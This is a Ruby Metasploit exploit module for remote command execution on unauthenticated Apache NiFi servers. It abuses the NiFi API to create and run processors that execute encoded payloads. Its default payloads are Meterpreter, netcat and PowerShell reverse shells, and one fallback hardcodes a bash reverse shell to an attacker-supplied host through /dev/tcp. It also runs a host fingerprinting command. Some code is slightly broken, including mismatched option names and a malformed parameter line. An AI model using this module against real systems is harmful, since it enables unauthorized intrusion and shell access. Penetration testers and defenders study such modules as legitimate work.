##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'        => 'Apache NiFi RCE',
                      'Description' => %q(
    Apache's NiFi application allows users to run system commands
    using API calls to create, start, and stop ExecuteScript and
    ExecuteProcess processors.  If there is no authentication or
    roles set up, any user can use this to get command execution
    on the system.

    This has been tested on all Linux versions of NiFi from 1.2.0 to 1.8.0'
    This has been tested on NiFi version 1.8.0 for Windows.'
    ),
      'Author'      => [ 'Ryne Hanson @_hansonet_'],
      'License'     => MSF_LICENSE,
      'References'  =>
    [
      [ 'URL', 'http://google.com' ],
    ],
    'Privileged'  => false,
    'Arch' => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],
    'Platform' => %w{ win linux unix python },
    'Targets'     => [ 
      ['Linux - Python',
       'Platform' => 'python',
       'DefaultOptions' => {'PAYLOAD' => 'python/meterpreter/reverse_tcp'}
    ],
    ['Linux/Docker - CMD',
     'Platform' => 'unix',
     'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat'},
     'Payload' => {
       'Compat' => {
         'PayloadType' => 'cmd'
       }
     }
    ],
    ['Windows - Powershell',
     'Platform' => 'win',
     'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/reverse_powershell'},
     'Payload' => {
       'Compat' => {
         'PayloadType' => 'cmd',
         'RequiredCmd' => 'powershell'
       }
     }
    ]
    ],
    'DefaultTarget'  => 0,
    'DisclosureDate' => 'Jun 19 2018'))
    register_options(
      [
        OptString.new('NiFi-Path', [true, 'Location of NiFi API', '/nifi-api']),
        OptString.new('Check-OS', [false, 'Check Operating System of server before exploiting, does same thing as check', 'true']),
        Opt::RPORT(8080)
      ])
    register_advanced_options(
      [
      ])
  end

  def check
    res = send_request_raw({
      'method' => 'GET',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/process-groups/root')
    })
    if res && res.code == 200
      version = get_nifi_version
      print_status("NiFi Version: #{version}")
        check_os
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    $target_id = get_target_id


    # Check operating system if selected in options
    if datastore['Check-OS'] == 'true'
      print_status("Checking OS before beginning...")
      check_os
    end

    print_status("Getting everything ready...")
    exec_processor = create_command_processor("ExecuteProcess", "1").get_json_document


    if datastore['target'] == 0
      commandArgs = "-c}\"import base64, os, sys; a = base64.b64decode('#{Base64.strict_encode64(payload.encoded)}').decode('utf-8'); exec(a)\""
    else
      commandArgs = "-c}\"import base64, os, sys; a = base64.b64decode('#{Base64.strict_encode64(payload.encoded)}').decode('utf-8'); os.system(a)\""
    end

    configure_processor(exec_processor, "python", commandArgs)

    sleep(1)
    print_status("Attempting via native OS python method")
    start_processor(exec_processor)
    sleep(1)

    if not get_processor_status(exec_processor).empty?
      print_status("Looks like python isn't on the system...shifting to NiFi jython method with /bin/bash")
      print_warning("This method will not allow for cleaning up if it works...you will have to do it manually!!")

      script_proc = create_script_processor("ExecuteScript", "2").get_json_document

      configure_script_processor(script_proc)
      sleep(1)

      print_status("Attempting via Script Processor...")
      start_processor(script_proc)
      sleep(1)

      # Cleanup if Script Processor Fails
      stop_processor(script_proc)
      sleep(1)
      delete_processor(script_proc)
    end

    # Cleanup
    stop_processor(exec_processor)
    sleep(5)
    delete_processor(exec_processor)
  end

  # Identifies the workspace that API requests will go to
  def get_target_id
    target_id = send_request_cgi({
      'method' => 'GET',
      'uri'=> normalize_uri(datastore["Nifi-Path"], '/process-groups/root')
    }).get_json_document["id"]
  end

  # API calls change depending on the version - this helps change them based on the application version
  def get_nifi_version
    version = send_request_cgi({
      'uri' => normalize_uri(datastore["Nifi-Path"], '/flow/about')}).get_json_document['about']['version']
  end

  # Every change to a processor creates a new version that must be referenced in order to access it again
  def get_processor_version(processor)
    version = send_request_raw({
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id'])
    }).get_json_document["revision"]["version"]
  end

  # Checks for any errors while running the processors
  # Determines whether or not to attempt using ExecuteScript processors
  def get_processor_status(processor)
    status = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore["Nifi-Path"], 'processors/', processor['id']),
    }).get_json_document['bulletins']
  end

  def check_os
    os_checker = create_command_processor("ExecuteProcess", "OS-Check").get_json_document
    configure_processor(os_checker, "cat", "/proc/1/cgroup")
    start_processor(os_checker)
    sleep(5)
    print_status("Two more seconds and results should be in.")
    sleep(2)
    stop_processor(os_checker)
    params = {
      "provenance":{
        "request":{
          "maxResults":1000,
          "summarize":true,
          "incrementalResults":false,
          "searchTerms":{
            "ProcessorID":os_checker['id']
          },
        },
      }

    }

    prov_params = JSON.pretty_generate(params)

    prov = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/provenance'),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => prov_params
    }).get_json_document

    sleep(1)

    send_request_raw({
      'method' => 'DELETE',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/provenance', prov['provenance']['id']),
    })


    if prov['provenance']['results']['totalCount'] != 0
      prov_id = prov['provenance']['results']['provenanceEvents'][0]['id']
      os_info = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri('/nifi-content-viewer', "?ref=http%3A%2F%2F#{datastore['RHOST']}%3A#{datastore['RPORT']}%2Fnifi-api%2Fprovenance-events%2F#{prov_id}%2Fcontent%2Foutput"),
      })

      if os_info.body.downcase.include?("docker")
        print_good "NiFi is definitely running in a Docker container"
        print_status "Meterpreter probably won't work"
        print_status "*********"

        if datastore['target'] == 1
          print_good "You have the best target selected for this OS"
        else
          print_status "Set target to 'Linux - CMD' for best odds"      
        end

        print_status "*********"
      else
        print_good "It looks like NiFi is running in Linux"
        print_status "Meterpreter payloads might be a good bet"
        print_status "*********"

        if datastore['target'] == 0
          print_good "You have the best target selected for this OS"
        else
          print_status "Set target to 'Linux - Python' for best odds"      
        end

        print_status "*********"
      end
    else
      print_error "Unable to detect OS definitively"
      print_status "This is either an old version of NiFi or Windows based"
    end
    #delete_processor(os_checker)
  end


  # Creates an ExecuteProcess processor
  # This is always the first method attempted
  def create_command_processor(type, name)
    params = {
      :revision => {
        :clientId => "",
        :version => 0
      },
      :component => {
        :type => "org.apache.nifi.processors.standard.#{type}",
        :name => name,
        :position => {
          :x => 0,
          :y => 0
        }
      }
    }

    data_params = JSON.pretty_generate(params)

    processor = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/process-groups/', $target_id, '/processors'),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => data_params

    })
  end

  def configure_processor(processor, command, commandArgs)
    params = {
      :component => {
        :id => processor["id"],
        :name => processor["component"]["name"],
        :config => {
          :concurrentlySchedulableTaskCount => "1",
          :schedulingPeriod => "5 sec",
          :executionNode => "ALL",
          :penaltyDuration => "30 sec",
          :yieldDuration => "1 sec",
          :bulletinLevel => "WARN",
          :schedulingStrategy => "TIMER_DRIVEN",
          :comments => "",
          :autoTerminatedRelationships => ["success"],
          :properties => {
            :Command => command,
            "Command Arguments": commandArgs,
            "Batch Duration":"5 sec",
            "Redirect Error Stream":"false",
            "Argument Delimiter":"\}"
          }
        },
        :state => "STOPPED"},
        :revision => {
          :clientId => "",
          :version => get_processor_version(processor)
        }
    }

    data_params = JSON.pretty_generate(params)

    configure = send_request_raw({
      'method' => 'PUT',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json' },
      'data' => data_params
    })
    return configure
  end

  # Creates an ExcecuteScript processor
  # This is the second attempt if python is not installed on a Linux target
  def create_script_processor(type, name)
    params = {
      :revision => {
        :clientId => "",
        :version => 0
      },
      :component => {
        :type => "org.apache.nifi.processors.script.#{type}",
        :name => name,
        :position => {
          :x => 0,
          :y => 0
        }
      }
    }

    data_params = JSON.pretty_generate(params)

    processor = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/process-groups/', $target_id, '/processors'),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => data_params
    })
    return processor
  end

  def configure_script_processor(processor)
    # This method should only execute on Linux machines
    # so hardcoding the payload should always work
    cmd1 = 'echo "/bin/bash -i >& /dev/tcp/' + datastore["LHOST"].to_s + "/" + datastore["LPORT"].to_s + ' 0>&1" > /tmp/shell.sh'
    cmd2 = "chmod +x /tmp/shell.sh"
    cmd3 = "/bin/bash /tmp/shell.sh"
    cmd4 = "rm /tmp/shell.sh"

    scriptBody = "import os; os.system('#{cmd1}'); os.system('#{cmd2}'); os.system('#{cmd3}'); os.system('#{cmd4}')"
    params = {
      :component => {
        :id => processor["id"],
        :name => processor["component"]["name"],
        :config => {
          :concurrentlySchedulableTaskCount => "1",
          :schedulingPeriod => "5 sec",
          :executionNode => "ALL",
          :penaltyDuration => "30 sec",
          :yieldDuration => "1 sec",
          :bulletinLevel => "WARN",
          :schedulingStrategy => "TIMER_DRIVEN",
          :comments => "",
          :autoTerminatedRelationships => ["failure","success"],
          :properties => {
            "Script Engine":"python",
            "Script Body":scriptBody
          }
        },
        :state => "STOPPED"},
        :revision => {
          :clientId => "",
          :version => get_processor_version(processor)
        }
    }
    if get_nifi_version != '1.2.0'
      params[:diconnectedNodeAcknowledged => "false"]
    end

    data_params = JSON.pretty_generate(params)

    configure = send_request_raw({
      'method' => 'PUT',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json' },
      'data' => data_params
    })
    return configure
  end

  def start_processor(processor)
    params = {
      :revision => {
        :clientId => "",
        :version => get_processor_version(processor)
      },
      :component => {
        :id => processor["id"],
        :state => "RUNNING"
      }
    }

    data_params = JSON.pretty_generate(params)

    startProcess = send_request_raw({
      'method' => 'PUT',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => data_params
    })
  end

  def stop_processor(processor)
    params = {
      :revision => {
        :clientId => "",
        :version => get_processor_version(processor)
      },
      :component => {
        :id => processor["id"],
        :state => "STOPPED"
      }
    }

    data_params = JSON.pretty_generate(params)

    stopProcess = send_request_raw({
      'method' => 'PUT',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => data_params
    })
  end

  def delete_processor(processor)
    deleteProcessor = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'vars_get' => {
        'version' => get_processor_version(processor).to_s,
        'clientId' => ''
      }
    })
    return deleteProcessor
  end

end
